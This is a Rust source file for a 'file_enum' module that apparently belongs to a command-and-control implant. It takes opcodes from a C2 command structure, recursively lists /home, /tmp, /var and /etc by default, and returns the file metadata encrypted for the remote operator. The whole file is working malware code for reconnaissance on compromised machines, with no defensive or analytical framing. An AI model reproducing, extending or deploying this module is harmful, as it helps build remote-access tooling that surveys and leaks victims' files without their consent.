//! File enumeration module — recursive directory traversal.
//!
//! Collects file metadata (name, size, modified, type) for files
//! matching specified criteria.

use anyhow::Result;
use tracing::info;

use crate::c2::Command;
use crate::crypto;
use crate::modules::ModuleError;
use crate::utils::FileMetadata;

/// File enumeration module
pub struct FileEnumModule;

impl FileEnumModule {
    pub fn new() -> Self {
        Self
    }

    /// Enumerate files in a directory
    fn enumerate_directory(path: &str, filter: Option<&str>) -> Result<Vec<FileMetadata>, ModuleError> {
        let mut files = Vec::new();

        let entries = std::fs::read_dir(path)
            .map_err(|e| {
                if e.kind() == std::io::ErrorKind::PermissionDenied {
                    ModuleError::PermissionDenied
                } else {
                    ModuleError::Io(e)
                }
            })?;

        for entry in entries {
            let entry = entry.map_err(ModuleError::Io)?;
            let metadata = entry.metadata().map_err(ModuleError::Io)?;
            let file_name = entry.file_name();
            let file_name_str = file_name.to_string_lossy();

            // Apply extension filter if specified
            if let Some(filter) = filter {
                if let Some(ext) = entry.path().extension() {
                    if ext.to_string_lossy() != filter {
                        continue;
                    }
                } else {
                    continue;
                }
            }

            // Skip hidden files and system directories
            if file_name_str.starts_with('.') || file_name_str.starts_with("$") {
                continue;
            }

            // Skip large directories
            if metadata.is_dir() {
                if metadata.len() > 100_000_000 {
                    continue;
                }
            }

            let modified = metadata.modified()
                .ok()
                .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                .map(|d| d.as_secs());

            files.push(FileMetadata {
                name: entry.path().to_string_lossy().to_string(),
                size: metadata.len(),
                modified,
                is_dir: metadata.is_dir(),
                is_file: metadata.is_file(),
            });
        }

        Ok(files)
    }

    /// Enumerate files recursively up to a depth limit
    fn enumerate_recursive(path: &str, max_depth: u32, current_depth: u32, filter: Option<&str>) -> Result<Vec<FileMetadata>, ModuleError> {
        if current_depth > max_depth {
            return Ok(Vec::new());
        }

        let mut files = Self::enumerate_directory(path, filter)?;

        // Recurse into subdirectories
        for entry in std::fs::read_dir(path).map_err(ModuleError::Io)? {
            let entry = entry.map_err(ModuleError::Io)?;
            let metadata = entry.metadata().map_err(ModuleError::Io)?;

            if metadata.is_dir() {
                let sub_path = entry.path().to_string_lossy().to_string();
                let sub_files = Self::enumerate_recursive(&sub_path, max_depth, current_depth + 1, filter)?;
                files.extend(sub_files);
            }
        }

        Ok(files)
    }
}

#[async_trait::async_trait]
impl crate::modules::Module for FileEnumModule {
    fn name(&self) -> &str {
        "file_enum"
    }

    async fn execute(&self, cmd: &Command) -> Result<Vec<u8>, ModuleError> {
        if cmd.cmd_type != 0x01 && cmd.cmd_type != 0x0B {
            return Err(ModuleError::Execution("no_match".to_string()));
        }

        // Parse path and filter from command data
        let path = String::from_utf8_lossy(&cmd.data).to_string();
        let path = if path.is_empty() {
            // Default: enumerate common directories
            vec![
                "/home".to_string(),
                "/tmp".to_string(),
                "/var".to_string(),
                "/etc".to_string(),
            ]
        } else {
            vec![path]
        };

        let mut all_files = Vec::new();

        for dir_path in &path {
            match Self::enumerate_recursive(dir_path, 5, 0, None) {
                Ok(files) => all_files.extend(files),
                Err(e) => {
                    info!("Failed to enumerate {}: {}", dir_path, e);
                }
            }
        }

        // Serialize file metadata
        let json = serde_json::to_string(&all_files)
            .map_err(|e| ModuleError::Execution(format!("JSON serialize: {}", e)))?;

        // Encrypt result
        let encrypted = crypto::encrypt_with_integrity(json.as_bytes(), &cmd.crypto_key);

        info!("File enum: {} files found", all_files.len());
        Ok(encrypted)
    }
}
